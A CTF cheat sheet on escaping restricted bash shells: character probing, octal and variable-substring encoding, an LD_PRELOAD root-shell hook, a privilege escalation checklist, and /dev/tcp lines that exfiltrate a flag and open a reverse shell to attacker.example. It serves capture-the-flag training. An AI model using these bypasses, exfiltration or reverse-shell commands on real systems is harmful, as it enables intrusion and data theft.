# CTF Misc - Bash Jails & Restricted Shells

## Table of Contents
- [Identifying the Jail](#identifying-the-jail)
- [Eval Context Detection](#eval-context-detection)
- [Character-Restricted Bash: Only #, $, \](#character-restricted-bash-only---)
- [Internal Service Discovery (Post-Shell)](#internal-service-discovery-post-shell)
- [Other Restricted Character Set Tricks](#other-restricted-character-set-tricks)
  - [Building numbers from $# and ${##}](#building-numbers-from--and-)
  - [Using PID digits](#using-pid-digits)
  - [Octal in ANSI-C quoting](#octal-in-ansi-c-quoting)
  - [Dollar-zero variants](#dollar-zero-variants)
- [Privilege Escalation Checklist (Post-Shell)](#privilege-escalation-checklist-post-shell)
- [HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
- [Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)](#bash-jail-bypass-via--octal-encoding-34c3-ctf-2017)
- [LD_PRELOAD Hook via rbash-Allowed Variable Set (OTW Advent 2018)](#ld_preload-hook-via-rbash-allowed-variable-set-otw-advent-2018)
- [/dev/tcp Exfiltration from Minimal Command Set (OTW Advent 2018)](#devtcp-exfiltration-from-minimal-command-set-otw-advent-2018)
- [Layer-by-Layer Echo-Only Bash Escape (Insomnihack 2019)](#layer-by-layer-echo-only-bash-escape-insomnihack-2019)
- [Closed-Stdout Jail with \r Truncation (Insomnihack 2019)](#closed-stdout-jail-with-r-truncation-insomnihack-2019)
- [References](#references)

---

## Identifying the Jail

**Methodology:** Send test inputs and observe error messages to determine:
1. What characters are allowed (whitelist vs blacklist)
2. Whether input is `eval`'d, passed to `bash -c`, or something else
3. Whether input is wrapped in quotes (double-quoted eval context)

**Test for character filtering:**
```python
from pwn import *
import time

# Send each char combined with a known-good payload
for c in range(32, 127):
    r = remote(host, port, level='error')
    r.sendline(b'$#' + bytes([c]) + b'$#')
    time.sleep(0.3)
    try:
        data = r.recv(timeout=1)
        if data:
            print(f'{chr(c)!r}: {data.decode().strip()[:60]}')
    except:
        pass
    r.close()
```

**Silent rejection = character not allowed.** Error output = character passed the filter.

**Key insight:** Systematically probe each printable character to map the allowed set before crafting payloads. Silent rejection means the character is filtered; any error output means it passed the filter and reached the shell.

---

## Eval Context Detection

**Double-quoted eval** (`eval "$input"`):
- Trailing `\` causes: `unexpected EOF while looking for matching '"'`
- `$#` expands to `0` (inside double-quotes, `$` still expands)
- `\$` gives literal `$` (backslash escapes dollar in double-quotes)
- `\#` gives `\#` literally (backslash doesn't escape `#` in double-quotes, but eval then interprets `\#` as literal `#`)

**Bare eval** (`eval $input`):
- Word splitting applies
- Backslash escapes work differently

**Read behavior:**
- `read -r`: backslashes preserved literally
- `read` (without -r): backslash is escape character (strips backslashes)

**Key insight:** Distinguish between `eval "$input"` (double-quoted) and `eval $input` (bare) by sending a trailing backslash. Double-quoted eval produces an "unexpected EOF" error because the backslash escapes the closing quote; bare eval does not. This determines which escape sequences are available for exploitation.

---

## Character-Restricted Bash: Only `#`, `$`, `\`

**Pattern (HashCashSlash):** Filter regex `^[\\#\$]+$` allows only hash, dollar, backslash.

**Available expansions:**
| Construct | Result | Notes |
|-----------|--------|-------|
| `$#` | `0` | Number of positional parameters |
| `$$` | PID | Current process ID (multi-digit number) |
| `\$` | literal `$` | In double-quoted eval context |
| `\\` | literal `\` | In double-quoted eval context |
| `\#` | literal `#` | Via eval's second-pass interpretation |

**Key payload: `\$$#`**

In a double-quoted eval context like `bash -c "\"${x}\""`:
- `\$` → literal `$` (backslash escapes dollar in double-quotes)
- `$#` → `0` (parameter expansion)
- Combined: `$0` in the eval context
- `$0` = the shell name = `bash`
- Result: **spawns an interactive bash shell**

**Why it works:** The script wraps input in double quotes for `bash -c`, so `\$` becomes a literal `$`, then `$#` expands to `0`, giving the string `$0`. When eval executes this, `$0` expands to the shell invocation name (`bash`), spawning a new shell.

---

## Internal Service Discovery (Post-Shell)

After escaping the jail, the flag may not be directly readable. Check for internal services:

```bash
# Find all running processes and their command lines
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '

# Look specifically for flag-serving processes
for pid in /proc/[0-9]*/; do
    cmd=$(cat ${pid}cmdline 2>/dev/null | tr '\0' ' ')
    if echo "$cmd" | grep -qi flag; then
        echo "PID $(basename $pid): $cmd"
        cat ${pid}status 2>/dev/null | grep -E "^(Uid|Name):"
    fi
done
```

**Common patterns:**
- `socat TCP-LISTEN:PORT,bind=127.0.0.1 EXEC:cat /flag` → flag on localhost port
- `readflag` binary with SUID bit
- Flag in environment of root process

**Connect to internal services:**
```bash
# Bash built-in TCP (no netcat needed)
cat < /dev/tcp/127.0.0.1/PORT

# Or with netcat if available
nc 127.0.0.1 PORT
```

**Key insight:** After escaping the jail, check `/proc/*/cmdline` for internal services serving the flag on localhost. The flag is often on a different process, not readable from the filesystem directly.

---

## Other Restricted Character Set Tricks

### Building numbers from `$#` and `${##}`
If `{` and `}` are allowed:
- `$#` = 0
- `${##}` = 1 (length of `$#`'s string value "0")
- Concatenate to build binary: `${##}$#${##}` = "101"

### Using PID digits
`$$` gives a multi-digit number. If you can extract individual digits (requires `{}` and `:`):
```bash
${$$:0:1}  # First digit of PID
${$$:1:1}  # Second digit of PID
```

### Octal in ANSI-C quoting
If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`

### Dollar-zero variants
| Shell | `$0` value |
|-------|-----------|
| bash script | script path |
| bash -c | `bash` |
| interactive | `bash` or `-bash` |
| sh | `sh` |

**Key insight:** Build arbitrary strings from minimal character sets by combining `$#` (yields 0), `${##}` (yields 1), `$$` (PID digits), and ANSI-C quoting (`$'\NNN'` for octal). Even a 3-character alphabet (`#$\`) is sufficient to spawn a shell via `$0` expansion.

---

## Privilege Escalation Checklist (Post-Shell)

1. **SUID binaries:** `find / -perm -4000 2>/dev/null`
2. **Capabilities:** `find / -executable -type f -exec getcap {} \; 2>/dev/null`
3. **Internal services:** Check `/proc/*/cmdline` for flag-serving daemons
4. **Process UIDs:** `cat /proc/*/status 2>/dev/null | grep -A5 "^Name:.*flag"`
5. **Writable paths:** Check if PATH contains writable dirs
6. **Docker/container:** `/dev/tcp` for internal service access, `/.dockerenv` presence

**Key insight:** After escaping the jail, run through this checklist in order: SUID binaries and capabilities first (quickest wins), then internal services via `/proc/*/cmdline`, then writable PATH directories. In containers, use `/dev/tcp` for internal service access since netcat is rarely available.

---

## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)

Read arbitrary files in restricted bash shells without cat/less/head:

```bash
# Method 1: HISTFILE loading
HISTFILE=/path/to/flag /bin/bash
history  # Flag contents loaded as command history

# Method 2: bash verbose mode
bash -v flag.txt  # Prints each line before executing; comments (#flag{...}) print without error

# Method 3: ctypes.sh direct C library calls
dlcall -n fd open /flag 0
dlcall -n m mmap 0 100 1 1 $fd 0
dlcall printf %s $m
```

**Key insight:** Three ways to read files without standard utilities: (1) HISTFILE loading, (2) `bash -v` verbose mode, (3) `ctypes.sh` direct C library calls via `dlcall`.

---

## Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)

When a-z, `*`, `?`, `.` are banned, use `$'...'` ANSI-C quoting with octal escapes:

```bash
# Encode /get_flag as octal
__=$'\057\147\145\164\137\146\154\141\147'
$__  # executes /get_flag

# Or encode any command character by character:
# /bin/sh = $'\057\142\151\156\057\163\150'
```

Also: extract characters from existing environment variables:

```bash
# ${VARIABLE:START:LENGTH} extracts substrings
# Build command from $PATH, $HOME, $OSTYPE, $HOSTNAME:
/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}...
```

**Key insight:** Bash's `$'...'` syntax interprets `\NNN` as octal byte values, allowing arbitrary string construction without using any alphabetic characters. Combined with environment variable substring extraction (`${VAR:offset:length}`), this bypasses nearly any character blacklist. The `__` variable name uses only underscores (often not blocked). When letters are banned but `$`, `'`, `\`, and digits are allowed, octal encoding in ANSI-C quotes is the primary escape vector.

---

## LD_PRELOAD Hook via rbash-Allowed Variable Set (OTW Advent 2018)

**Pattern:** rbash blocks path arguments but still allows `VAR=value command` prefixes on invocations of permitted binaries. Upload a shared object encoding a libc hook, then export `LD_PRELOAD=./hook.so` before any command in the allowlist (`cat`, `ls`, `id`). The hook runs on every libc symbol call from the allowed binary.

```c
// hook.c — hijacks open()
#include <stdlib.h>
__attribute__((constructor))
void init(void) { system("/bin/bash -p -c 'cat /flag'"); }
```

```bash
gcc -shared -fPIC hook.c -o /tmp/hook.so
LD_PRELOAD=/tmp/hook.so cat   # constructor runs before cat
```

**Key insight:** Restricted shells enforce argv filtering, not environment filtering. Any allowed binary dynamically linked to libc can be hijacked through `LD_PRELOAD` as long as you can write a `.so` to a writable path. Harden by unsetting `LD_PRELOAD`, `LD_LIBRARY_PATH`, and `LD_AUDIT` on shell entry.

**References:** OverTheWire Advent 2018 — Claustrophobic, writeup 12770

---

## /dev/tcp Exfiltration from Minimal Command Set (OTW Advent 2018)

**Pattern:** Only `cat`, `echo`, and `dd` are available — no `curl`, `wget`, `nc`, `python`. Bash exposes `/dev/tcp/<host>/<port>` as a virtual socket file; redirecting to it opens a raw TCP connection without any extra binary.

```bash
cat /opt/flag > /dev/tcp/attacker.example/8081
# attacker side:
nc -lvnp 8081
```

Bidirectional shells:

```bash
exec 3<> /dev/tcp/attacker.example/8081
cat <&3 | bash >&3 2>&3
```

**Key insight:** `/dev/tcp` and `/dev/udp` are *built into bash*, not real filesystem paths — any distribution shipping GNU bash supports them even when `netcat`/`curl` are missing. Always test file redirection before assuming you need an external tool.

**References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12780

---

## Layer-by-Layer Echo-Only Bash Escape (Insomnihack 2019)

**Pattern:** Jail allows only `echo`, `(`, `)`, `+`, `=`, `;`, `\`, `$`, and whitespace. Escape by recursively constructing stronger primitives each round:

```bash
# Round 0: allowed chars → unlimited `=` via $((a = 1))
# Round 1: arithmetic sets more vars; use $'\NNN' via increment loops
a=$((++a))                       # counters without digits
# Round N: emit arbitrary payload as octal escapes
$('\143\141\164'  /flag)         # cat /flag
```

Build numbers using `++` on uninitialised variables, then index characters out of `$PATH`, `$PWD`, or any leaked variable. Finally concatenate those characters with `\` to form any command.

**Key insight:** Echo-only jails are escapable because bash's arithmetic context treats uninitialised variables as `0` and supports `++`, giving you any integer without digits. From there, `$'\NNN'` builds any byte, which builds any command.

**References:** Insomnihack teaser 2019 — echoechoechoecho, writeup 12911

---

## Closed-Stdout Jail with \r Truncation (Insomnihack 2019)

**Pattern:** A bash-exec service runs commands but has stdout (and stderr) closed, so normal output silently disappears. Additionally, the target file contains a `\r` early on that naive `cat` renders as "overwrite the line", hiding the flag behind it. Workaround is two-fold: redirect output to a still-open fd (stdin is connected to the network socket, or `/dev/tty`), and use `cat -A` / `od -c` / `xxd` so the carriage return shows as `^M` instead of truncating display.

```bash
# 1. confirm stdout is closed — output never returns
echo hello                      # nothing
echo hello 2>&1                 # still nothing (stderr also closed)

# 2. redirect to stdin (fd 0), which is the network socket for nc-style services
cat flag 1>&0
# returns only the tail after \r because the terminal interprets \r literally

# 3. use cat -A (show-all) so CR becomes ^M and the hidden prefix is revealed
cat -A flag 1>&0
# or: od -c flag 1>&0   /   xxd flag 1>&0   /   base64 flag 1>&0

# Alternative: reopen a writable stdout
exec 1>/dev/tty        # only works if a tty is attached
exec 1>&0              # duplicate the socket fd onto stdout for future cmds
```

**Key insight:** "Commands work but produce no output" means stdout is closed — find any still-open fd (stdin to the network socket is always open) and redirect with `1>&0`. Once output flows, beware of display artefacts: `\r` truncates in raw `cat`, ANSI CSI sequences can blank lines, and `\x1b[2J` clears the terminal. Always inspect suspect files with `cat -A`, `od -c`, `xxd`, or `base64` so no byte is lost in translation.

**References:** Insomnihack 2019 — myBrokenBash, writeups 13989 and 13990

---

## References

- 0xL4ugh CTF "HashCashSlash": Filter `^[\\#\$]+$`, payload `\$$#`, internal socat flag service
